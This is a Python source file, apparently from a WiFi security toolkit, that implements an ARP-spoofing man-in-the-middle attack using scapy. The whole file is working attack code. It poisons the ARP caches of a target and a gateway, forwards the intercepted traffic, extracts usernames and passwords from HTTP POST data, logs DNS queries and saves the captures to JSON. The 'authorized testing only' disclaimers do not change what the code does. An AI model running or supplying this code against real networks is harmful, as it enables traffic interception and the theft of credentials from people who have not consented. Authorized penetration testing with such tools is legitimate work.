#!/usr/bin/env python3
"""
MitM/ARP Spoofing Module for Hoover WiFi Security Toolkit
Man-in-the-middle testing via ARP cache poisoning on authorized networks.
Tests whether network segmentation and ARP inspection are properly configured.
For authorized security testing and research only.
"""

import sys
import os
import argparse
import json
import threading
import time
from datetime import datetime
from typing import Optional
from urllib.parse import unquote_plus

from scapy.layers.l2 import ARP, Ether
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.dns import DNS, DNSQR
from scapy.sendrecv import sniff, send, srp
from scapy.packet import Raw

from utils import validate_interface, require_root, setup_logging

DEFAULT_CAPTURE_PORTS: list[int] = [80, 8080, 443, 21, 25, 110, 143]

CREDENTIAL_FIELDS: list[str] = [
    "username", "password", "email", "login", "passwd", "user", "pass",
]


class MitMAttack:
    def __init__(self, interface: str, target_ip: str,
                 gateway_ip: str, output_dir: str = "captures",
                 timeout: int = 300, forward: bool = True,
                 capture_ports: Optional[list[int]] = None) -> None:
        self.interface: str = interface
        self.target_ip: str = target_ip
        self.gateway_ip: str = gateway_ip
        self.output_dir: str = output_dir
        self.timeout: int = timeout
        self.forward: bool = forward
        self.capture_ports: list[int] = (
            capture_ports if capture_ports is not None else list(DEFAULT_CAPTURE_PORTS)
        )
        self.logger = setup_logging("mitm_attack")

        self._stop_event = threading.Event()
        self._running: bool = False
        self._start_time: Optional[float] = None
        self._packets_captured: int = 0
        self._original_forwarding: Optional[str] = None

        self._target_mac: Optional[str] = None
        self._gateway_mac: Optional[str] = None

        self._captured_credentials: list[dict] = []
        self._captured_dns: list[dict] = []

        self._spoof_thread: Optional[threading.Thread] = None
        self._sniff_thread: Optional[threading.Thread] = None

    def _enable_ip_forwarding(self) -> None:
        """Enable IP forwarding by writing to /proc/sys/net/ipv4/ip_forward."""
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
                self._original_forwarding = f.read().strip()
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
            self.logger.info("IP forwarding enabled")
        except OSError as e:
            self.logger.error("Failed to enable IP forwarding: %s", e)
            raise

    def _disable_ip_forwarding(self) -> None:
        """Restore IP forwarding to its original state."""
        value = self._original_forwarding if self._original_forwarding is not None else "0"
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write(value)
            self.logger.info("IP forwarding restored to %s", value)
        except OSError as e:
            self.logger.error("Failed to disable IP forwarding: %s", e)

    def _get_mac(self, ip: str) -> Optional[str]:
        """Resolve IP address to MAC address via ARP request."""
        try:
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            answered, _ = srp(arp_request, iface=self.interface, timeout=2, verbose=False)
            if answered:
                return answered[0][1].hwsrc
            self.logger.warning("Could not resolve MAC for %s", ip)
            return None
        except Exception as e:
            self.logger.error("ARP resolution failed for %s: %s", ip, e)
            return None

    def _arp_spoof(self, target_ip: str, spoof_ip: str, target_mac: str) -> None:
        """Send ARP reply: 'spoof_ip is at our_mac' to target_mac."""
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False)

    def _restore_arp(self, target_ip: str, spoof_ip: str,
                     target_mac: str, real_mac: str) -> None:
        """Send corrective ARP reply to restore the original mapping."""
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                     psrc=spoof_ip, hwsrc=real_mac)
        send(packet, count=3, verbose=False)

    def _spoof_loop(self) -> None:
        """Continuously send spoofed ARP packets until stopped."""
        while not self._stop_event.is_set():
            try:
                self._arp_spoof(self.target_ip, self.gateway_ip, self._target_mac)
                self._arp_spoof(self.gateway_ip, self.target_ip, self._gateway_mac)
            except Exception as e:
                self.logger.error("ARP spoof error: %s", e)
            self._stop_event.wait(2)

    def packet_handler(self, packet) -> None:
        """Process captured packets for HTTP credentials and DNS queries."""
        self._packets_captured += 1

        if packet.haslayer(TCP) and packet.haslayer(Raw):
            self._extract_http_credentials(packet)

        if packet.haslayer(DNS) and packet.haslayer(DNSQR):
            self._extract_dns_query(packet)

    def _extract_http_credentials(self, packet) -> None:
        """Extract potential credentials from HTTP POST data."""
        try:
            payload = packet[Raw].load.decode("utf-8", errors="replace")
        except Exception:
            return

        payload_lower = payload.lower()
        found_fields: dict[str, str] = {}

        for field in CREDENTIAL_FIELDS:
            # Look for field=value patterns in POST data
            search_key = field + "="
            idx = payload_lower.find(search_key)
            if idx != -1:
                value_start = idx + len(search_key)
                # Find end of value (next & or end of string)
                end_idx = payload.find("&", value_start)
                if end_idx == -1:
                    value = payload[value_start:]
                else:
                    value = payload[value_start:end_idx]
                value = unquote_plus(value).strip()
                if value:
                    found_fields[field] = value

        if found_fields:
            src_ip = packet[IP].src if packet.haslayer(IP) else "unknown"
            dst_ip = packet[IP].dst if packet.haslayer(IP) else "unknown"
            dst_port = packet[TCP].dport if packet.haslayer(TCP) else 0

            credential_entry = {
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "dst_port": dst_port,
                "fields": found_fields,
            }
            self._captured_credentials.append(credential_entry)
            self.logger.info("Captured credentials from %s -> %s:%d: %s",
                             src_ip, dst_ip, dst_port, list(found_fields.keys()))

    def _extract_dns_query(self, packet) -> None:
        """Log DNS queries from captured traffic."""
        try:
            dns_query = packet[DNSQR].qname
            if isinstance(dns_query, bytes):
                dns_query = dns_query.decode("utf-8", errors="replace")
            # Strip trailing dot
            dns_query = dns_query.rstrip(".")

            src_ip = packet[IP].src if packet.haslayer(IP) else "unknown"

            dns_entry = {
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "src_ip": src_ip,
                "query": dns_query,
            }
            self._captured_dns.append(dns_entry)
            self.logger.debug("DNS query from %s: %s", src_ip, dns_query)
        except Exception as e:
            self.logger.debug("DNS extraction error: %s", e)

    def _sniff_traffic(self) -> None:
        """Sniff traffic on the interface filtering for target IP and capture ports."""
        port_filter = " or ".join(f"port {p}" for p in self.capture_ports)
        bpf_filter = f"host {self.target_ip} and ({port_filter})"
        try:
            sniff(
                iface=self.interface,
                filter=bpf_filter,
                prn=self.packet_handler,
                stop_filter=lambda _: self._stop_event.is_set(),
                store=False,
                timeout=self.timeout,
            )
        except Exception as e:
            if not self._stop_event.is_set():
                self.logger.error("Sniff error: %s", e)

    def start(self) -> None:
        """Start the MitM attack: enable forwarding, resolve MACs, spoof + sniff."""
        self.logger.info("Starting MitM attack: target=%s gateway=%s",
                         self.target_ip, self.gateway_ip)

        if self.forward:
            self._enable_ip_forwarding()

        self._target_mac = self._get_mac(self.target_ip)
        if not self._target_mac:
            self.logger.error("Could not resolve target MAC for %s", self.target_ip)
            if self.forward:
                self._disable_ip_forwarding()
            return

        self._gateway_mac = self._get_mac(self.gateway_ip)
        if not self._gateway_mac:
            self.logger.error("Could not resolve gateway MAC for %s", self.gateway_ip)
            if self.forward:
                self._disable_ip_forwarding()
            return

        self._running = True
        self._start_time = time.time()
        self._stop_event.clear()

        self.logger.info("Target MAC: %s, Gateway MAC: %s",
                         self._target_mac, self._gateway_mac)

        self._spoof_thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self._spoof_thread.start()

        self._sniff_thread = threading.Thread(target=self._sniff_traffic, daemon=True)
        self._sniff_thread.start()

        self.logger.info("MitM attack running (timeout=%ds)", self.timeout)

    def stop(self) -> None:
        """Stop the attack, restore ARP tables, and disable forwarding."""
        self.logger.info("Stopping MitM attack...")
        self._stop_event.set()
        self._running = False

        try:
            # Restore ARP tables
            if self._target_mac and self._gateway_mac:
                self.logger.info("Restoring ARP tables...")
                self._restore_arp(self.target_ip, self.gateway_ip,
                                  self._target_mac, self._gateway_mac)
                self._restore_arp(self.gateway_ip, self.target_ip,
                                  self._gateway_mac, self._target_mac)
                self.logger.info("ARP tables restored")
        except Exception as e:
            self.logger.error("Error restoring ARP tables: %s", e)
        finally:
            if self.forward:
                self._disable_ip_forwarding()

        # Save captured data
        self._save_captured_data()

        # Wait for threads to finish
        if self._spoof_thread and self._spoof_thread.is_alive():
            self._spoof_thread.join(timeout=5)
        if self._sniff_thread and self._sniff_thread.is_alive():
            self._sniff_thread.join(timeout=5)

        self.logger.info("MitM attack stopped")

    def _save_captured_data(self) -> None:
        """Save captured credentials and DNS queries to JSON in output_dir."""
        data = self.get_captured_data()
        if not data["credentials"] and not data["dns_queries"]:
            self.logger.info("No data captured to save")
            return

        os.makedirs(self.output_dir, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filepath = os.path.join(self.output_dir, f"mitm_capture_{timestamp}.json")
        try:
            with open(filepath, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2)
            self.logger.info("Captured data saved to %s", filepath)
        except OSError as e:
            self.logger.error("Failed to save captured data: %s", e)

    def get_captured_data(self) -> dict:
        """Return captured credentials and DNS queries."""
        return {
            "credentials": list(self._captured_credentials),
            "dns_queries": list(self._captured_dns),
            "target_ip": self.target_ip,
            "gateway_ip": self.gateway_ip,
            "interface": self.interface,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }

    def get_status(self) -> dict:
        """Return current attack status."""
        elapsed = 0.0
        if self._start_time:
            elapsed = round(time.time() - self._start_time, 2)
        return {
            "running": self._running,
            "target_ip": self.target_ip,
            "gateway_ip": self.gateway_ip,
            "target_mac": self._target_mac,
            "gateway_mac": self._gateway_mac,
            "packets_captured": self._packets_captured,
            "credentials_found": len(self._captured_credentials),
            "dns_queries_captured": len(self._captured_dns),
            "elapsed_time": elapsed,
            "forward": self.forward,
        }


def main() -> None:
    parser = argparse.ArgumentParser(
        description="MitM Attack - ARP spoofing for authorized network testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic MitM between target and gateway
  sudo python3 mitm_attack.py -i eth0 --target 192.168.1.100 --gateway 192.168.1.1

  # Custom ports and timeout
  sudo python3 mitm_attack.py -i eth0 --target 192.168.1.100 --gateway 192.168.1.1 \\
      -p 80,443,8080 -t 600

  # Without IP forwarding (observe only)
  sudo python3 mitm_attack.py -i eth0 --target 192.168.1.100 --gateway 192.168.1.1 \\
      --no-forward

Note: For authorized security testing only.
        """,
    )

    parser.add_argument("-i", "--interface", required=True,
                        help="Network interface")
    parser.add_argument("--target", required=True,
                        help="Target IP address")
    parser.add_argument("--gateway", required=True,
                        help="Gateway IP address")
    parser.add_argument("-o", "--output-dir", default="captures",
                        help="Output directory for captured data (default: captures)")
    parser.add_argument("-t", "--timeout", type=int, default=300,
                        help="Timeout in seconds (default: 300)")
    parser.add_argument("--no-forward", action="store_true",
                        help="Disable IP forwarding")
    parser.add_argument("-p", "--ports",
                        help="Comma-separated ports to capture (default: 80,8080,443,21,25,110,143)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose output")

    args = parser.parse_args()
    require_root()

    capture_ports = None
    if args.ports:
        try:
            capture_ports = [int(p.strip()) for p in args.ports.split(",")]
        except ValueError:
            logger = setup_logging("mitm_attack")
            logger.error("Invalid port list: %s", args.ports)
            sys.exit(1)

    attack = MitMAttack(
        interface=args.interface,
        target_ip=args.target,
        gateway_ip=args.gateway,
        output_dir=args.output_dir,
        timeout=args.timeout,
        forward=not args.no_forward,
        capture_ports=capture_ports,
    )

    try:
        attack.start()
        # Wait for timeout or Ctrl+C
        attack._stop_event.wait(timeout=args.timeout)
    except KeyboardInterrupt:
        pass
    finally:
        attack.stop()


if __name__ == "__main__":
    main()
